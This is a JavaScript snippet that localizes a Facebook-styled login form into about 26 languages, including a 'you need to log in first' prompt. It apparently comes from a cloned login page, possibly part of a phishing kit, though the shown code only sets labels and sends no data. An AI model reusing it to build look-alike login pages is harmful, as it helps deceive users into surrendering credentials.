transItems = document.querySelectorAll(".translated");
var userLang = (navigator.language || navigator.userLanguage).split('-')[0];
var Translate = {
	ar: {
		dir: 'rtl',
		main: 'يجب تسجيل الدخول اولا',
		user: 'عنوان البريد الإلكتروني أو رقم الهاتف',
		pass: 'كلمه السر',
		button: 'تسجيل دخول',
		or: 'او',
		create: 'انشاء حساب جديد',
		footer1 :'ليس لديك حساب على فيسبوك؟',
        footer2 :'هل نسيت كلمة السر؟',
        footer3 :'سياسة البيانات',
        footer4 :'الشروط',
        footer5 :'سياسة ملفات تعريف الارتباط'

	},

	mn: {
		dir: 'ltr',
		main: 'Та эхлээд нэвтрэх хэрэгтэй.',
		user: 'Гар утасны дугаар эсвэл имэйл хаяг',
		pass: 'нууц үг',
		button: 'Нэвтрэх',
		or: 'эсвэл',
		create: 'Шинэ данс үүсгэх',
		footer1 :'Та Facebook хаяггүй юу?',
        footer2 :'Нууц үгээ мартсан?',
        footer3 :'мэдээллийн бодлого',
        footer4 :'нөхцөл',
        footer5 :'Күүкийн бодлого'

	},

	es: {
		dir: 'ltr',
		main: 'Primero debe iniciar sesión.',
		user: 'Número de móvil o dirección de correo electrónico',
		pass: 'clave',
		button: 'Iniciar sesión',
		or: 'o',
		create: 'Crear una nueva cuenta',
		footer1 :'¿No estás en Facebook?',
        footer2 :'¿Se te olvidó tu contraseña?',
        footer3 :'Política de datos',
        footer4 :'Condiciones',
        footer5 :'Política de cookies'

	},
	am: {
		dir: 'rtl',
		main: 'መጀመሪያ መግባት አለብህ።',
		user: 'የሞባይል ቁጥር ወይም ኢሜል አድራሻ',
		pass: 'ፕስወርድ',
		button: 'ግባ',
		or: 'ወይም',
		create: 'አዲስ መለያ ፍጠር',
		footer1 :'ፌስቡክ ላይ አይደለም?',
        footer2 :'መክፈቻ ቁልፉን ረሳኽው?',
        footer3 :'የውሂብ ፖሊሲ',
        footer4 :'ውሎች',
        footer5 :'የኩኪዎች ፖሊሲ'

	},
	bg: {
		dir: 'ltr',
		main: 'Първо трябва да влезете.',
		user: 'Имейл адрес или мобилен номер',
		pass: 'парола',
		button: 'Влизам',
		or: 'или',
		create: 'Създаване на нов акаунт',
		footer1 :'Не във Facebook?',
        footer2 :'Забравена парола?',
        footer3 :'Политика за данни',
        footer4 :'Условия',
        footer5 :'Политика за бисквитки'

	},
	bn: {
		dir: 'ltr',
		main: 'প্রথমে আপনাকে প্রবেশ করতে হবে.',
		user: 'ইমেল ঠিকানা বা মোবাইল নম্বর',
		pass: 'পাসওয়ার্ড',
		button: 'প্রবেশ করুন',
		or: 'বা',
		create: 'নতুন অ্যাকাউন্ট তৈরি',
		footer1 :'ফেসবুকে নেই?',
        footer2 :'পাসওয়ার্ড ভুলে গেছেন?',
        footer3 :'ডেটা নীতি',
        footer4 :'শর্তাবলী',
        footer5 :'কুকিজ নীতি'

	},
	cs: {
		dir: 'ltr',
		main: 'Nejprve se musíte přihlásit.',
		user: 'E-mailová adresa nebo mobilní číslo',
		pass: 'Heslo',
		button: 'Přihlásit se',
		or: 'nebo',
		create: 'Vytvořit nový účet',
		footer1 :'Nejste na Facebooku?',
        footer2 :'Zapomenuté heslo?',
        footer3 :'Zásady údajů',
        footer4 :'Podmínky',
        footer5 :'Zásady používání souborů cookie'

	},
	el: {
		dir: 'ltr',
		main: 'Πρέπει πρώτα να συνδεθείτε.',
		user: 'Διεύθυνση email ή αριθμός κινητού τηλεφώνου',
		pass: 'Κωδικός πρόσβασης',
		button: 'Σύνδεση',
		or: 'ή',
		create: 'Δημιουργία νέου λογαριασμού',
		footer1 :'Όχι στο Facebook;',
        footer2 :'Ξεχάσατε τον κωδικό?',
        footer3 :'Πολιτική δεδομένων',
        footer4 :'Οροι',
        footer5 :'Πολιτική cookies'

	},
	fi: {
		dir: 'ltr',
		main: 'Sinun on ensin kirjauduttava sisään.',
		user: 'Sähköpostiosoite tai matkapuhelinnumero',
		pass: 'Salasana',
		button: 'Kirjaudu sisään',
		or: 'tai',
		create: 'Luo uusi tili',
		footer1 :'Ei Facebookissa?',
        footer2 :'Unohtuiko salasana?',
        footer3 :'Tietokäytäntö',
        footer4 :'Ehdot',
        footer5 :'Evästekäytäntö'

	},
	fr: {
		dir: 'ltr',
		main: "Tu dois d'abord te connecter.",
		user: 'Adresse e-mail ou numéro de portable',
		pass: 'Mot de passe',
		button: 'Connexion',
		or: 'ou',
		create: 'Créer un nouveau compte',
		footer1 :'Pas sur Facebook ?',
        footer2 :'mot de passe oublié?',
        footer3 :'Politique de données',
        footer4 :'termes',
        footer5 :'Politique de cookies'

	},
	he: {
		dir: 'rtl',
		main: 'אתה צריך להתחבר תחילה.',
		user: 'כתובת אימייל או מספר טלפון',
		pass: 'סיסמה',
		button: 'התחברות',
		or: 'אוֹ',
		create: 'ליצור חשבון חדש',
		footer1 :'לא בפייסבוק?',
        footer2 :'שכחת ססמא?',
        footer3 :'מדיניות נתונים',
        footer4 :'תנאים',
        footer5 :'מדיניות קובצי ה-Cookie'

	},
	hi: {
		dir: 'ltr',
		main: 'आपको पहले लॉग इन करने की जरूरत है।',
		user: 'विद्युत डाक पता या मोबाइल नंबर',
		pass: 'पासवर्ड',
		button: 'लॉग इन करें',
		or: 'या',
		create: 'नया खाता बनाएँ',
		footer1 :'फेसबुक पर नहीं?',
        footer2 :'पासवर्ड भूल गए?',
        footer3 :'डेटा नीति',
        footer4 :'मामले',
        footer5 :'कुकीज़ नीति'

	},
	hu: {
		dir: 'ltr',
		main: 'Először be kell jelentkeznie.',
		user: 'E-mail cím vagy mobilszám',
		pass: 'Jelszó',
		button: 'Belépés',
		or: 'vagy',
		create: 'Új fiók létrehozása',
		footer1 :'Nem a Facebookon?',
        footer2 :'Elfelejtetted a jelszavad?',
        footer3 :'Adatkezelési szabályzat',
        footer4 :'Feltételek',
        footer5 :'Cookie-kra vonatkozó szabályzat'

	},
	id: {
		dir: 'ltr',
		main: 'Anda harus login terlebih dahulu.',
		user: 'Alamat email atau nomor ponsel',
		pass: 'Kata sandi',
		button: 'Gabung',
		or: 'atau',
		create: 'Buat akun baru',
		footer1 :'Tidak di Facebook?',
        footer2 :'Tidak ingat kata sandi?',
        footer3 :'Kebijakan Data',
        footer4 :'Ketentuan',
        footer5 :'Kebijakan Cookie'

	},
	it: {
		dir: 'ltr',
		main: 'Devi prima effettuare il login.',
		user: 'Indirizzo email o numero di cellulare',
		pass: "Parola d'ordine",
		button: 'Accedere',
		or: 'o',
		create: 'Crea un nuovo account',
		footer1 :'Non su Facebook?',
        footer2 :'Ha dimenticato la password?',
        footer3 :'Informativa sui dati',
        footer4 :'Termini',
        footer5 :'Politica sui cookie'

	},
	my: {
		dir: 'ltr',
		main: 'သင် ဦးစွာဝင်ရောက်ရန် လိုအပ်ပါသည်။',
		user: 'အီးမေးလ်လိပ်စာ သို့မဟုတ် မိုဘိုင်းနံပါတ်',
		pass: 'စကားဝှက်',
		button: 'လော့ဂ်အင်',
		or: 'သို့မဟုတ်',
		create: 'အကောင့်အသစ်ဖန်တီးပါ။',
		footer1 :'Facebook မှာ မဟုတ်ဘူးလား။',
        footer2 :'စကားဝှက်ကိုမေ့နေပါသလား?',
        footer3 :'ဒေတာမူဝါဒ',
        footer4 :'စည်းမျဥ်း',
        footer5 :'ကွတ်ကီးများနှင့် မူဝါဒ'

	},
	ne: {
		dir: 'ltr',
		main: 'तपाईंले पहिले लगइन गर्न आवश्यक छ।',
		user: 'इमेल ठेगाना वा मोबाइल नम्बर',
		pass: 'पासवर्ड',
		button: 'लग - इन',
		or: 'वा',
		create: 'नयाँ खाता सिर्जना गर्नुहोस्',
		footer1 :'फेसबुकमा छैन?',
        footer2 :'पासवर्ड भुल्नु भयो?',
        footer3 :'डाटा नीति',
        footer4 :'सर्तहरू',
        footer5 :'कुकीज नीति'

	},
	ph: {
		dir: 'ltr',
		main: 'Kailangan mo munang mag-login.',
		user: 'Email address o Mobile number',
		pass: 'Password',
		button: 'Mag log in',
		or: 'o',
		create: 'Lumikha ng Bagong Account',
		footer1 :'Wala sa Facebook?',
        footer2 :'Nakalimutan ang password?',
        footer3 :'Patakaran sa Data',
        footer4 :'Mga tuntunin',
        footer5 :'Patakaran sa Cookies'

	},
	pl: {
		dir: 'ltr',
		main: 'Musisz się najpierw zalogować.',
		user: 'Adres email czy numer telefonu',
		pass: 'Hasło',
		button: 'Zaloguj sie',
		or: 'lub',
		create: 'Stwórz nowe konto',
		footer1 :'Nie na Facebooku?',
        footer2 :'Zapomniałeś hasła?',
        footer3 :'Polityka dotycząca danych',
        footer4 :'Warunki',
        footer5 :'Polityka plików cookie'

	},
	pt: {
		dir: 'ltr',
		main: 'Você precisa fazer o login primeiro.',
		user: 'Endereço de email ou número de celular',
		pass: 'Senha',
		button: 'Conecte-se',
		or: 'ou',
		create: 'Criar nova conta',
		footer1 :'Não está no Facebook?',
        footer2 :'Esqueceu sua senha?',
        footer3 :'Política de Dados',
        footer4 :'Termos',
        footer5 :'Política de Cookies'

	},
	ro: {
		dir: 'ltr',
		main: 'Mai întâi trebuie să vă autentificați.',
		user: 'Adresă de e-mail sau număr de telefon',
		pass: 'Parola',
		button: 'Log in',
		or: 'sau',
		create: 'Creează un cont nou',
		footer1 :'Nu pe Facebook?',
        footer2 :'Ați uitat parola?',
        footer3 :'Politica de date',
        footer4 :'Termeni',
        footer5 :'Politica de cookie-uri'

	},
	sw: {
		dir: 'ltr',
		main: 'Unahitaji kuingia kwanza.',
		user: 'Anwani ya barua pepe au nambari ya rununu',
		pass: 'Nenosiri',
		button: 'Ingia',
		or: 'au',
		create: 'Fungua Akaunti Mpya',
		footer1 :'Sio kwenye Facebook?',
        footer2 :'Umesahau nywila?',
        footer3 :'Sera ya Data',
        footer4 :'Masharti',
        footer5 :'Sera ya Vidakuzi'

	},
	th: {
		dir: 'ltr',
		main: 'คุณต้องเข้าสู่ระบบก่อน',
		user: 'ที่อยู่อีเมลหรือหมายเลขโทรศัพท์มือถือ',
		pass: 'รหัสผ่าน',
		button: 'เข้าสู่ระบบ',
		or: 'หรือ',
		create: 'สร้างบัญชีใหม่',
		footer1 :'ไม่ได้ใช้งาน Facebook?',
        footer2 :'ลืมรหัสผ่าน?',
        footer3 :'นโยบายข้อมูล',
        footer4 :'เงื่อนไข',
        footer5 :'นโยบายคุกกี้'

	},
	tr: {
		dir: 'ltr',
		main: 'Önce oturum açmanız gerekir.',
		user: 'E-posta adresi veya cep telefonu numarası',
		pass: 'Parola',
		button: 'Giriş yapmak',
		or: 'veya',
		create: 'Yeni hesap oluştur',
		footer1 :"Facebook'ta değil mi?",
        footer2 :'Parolanızı mı unuttunuz?',
        footer3 :'Veri Politikası',
        footer4 :'Şartlar',
        footer5 :'Çerez Politikası'

	},
	ur: {
		dir: 'rtl',
		main: 'آپ کو پہلے لاگ ان کرنے کی ضرورت ہے۔',
		user: 'ای میل ایڈریس یا موبائل نمبر',
		pass: 'پاس ورڈ',
		button: 'لاگ ان کریں',
		or: 'یا',
		create: 'نیا اکاؤنٹ بنانے',
		footer1 :'فیس بک پر نہیں؟',
        footer2 :'پاسورڈ بھول گے؟',
        footer3 :'ڈیٹا پالیسی',
        footer4 :'شرائط',
        footer5 :'کوکیز کی پالیسی'
	},
	vi: {
		dir: 'ltr',
		main: 'Bạn cần phải đăng nhập đầu tiên.',
		user: 'Địa chỉ email hoặc số điện thoại di động',
		pass: 'Mật khẩu',
		button: 'Đăng nhập',
		or: 'hoặc',
		create: 'Tạo tài khoản mới',
		footer1 :'Không có trên Facebook?',
        footer2 :'Quên mật khẩu?',
        footer3 :'Chính sách dữ liệu',
        footer4 :'Điều kiện',
        footer5 :'Chính sách cookie'

	}
};


transItems[0].style.direction = Translate[userLang].dir;
transItems[1].innerHTML = Translate[userLang].main;
transItems[2].setAttribute("placeholder", Translate[userLang].user);
transItems[3].setAttribute("placeholder", Translate[userLang].pass);
transItems[4].innerHTML = Translate[userLang].button;
transItems[5].innerHTML = Translate[userLang].or;
transItems[6].innerHTML = Translate[userLang].create;
transItems[7].innerHTML =Translate[userLang].footer1;
transItems[8].innerHTML =Translate[userLang].footer2;
transItems[9].innerHTML =Translate[userLang].footer3;
transItems[10].innerHTML =Translate[userLang].footer4;
transItems[11].innerHTML =Translate[userLang].footer5;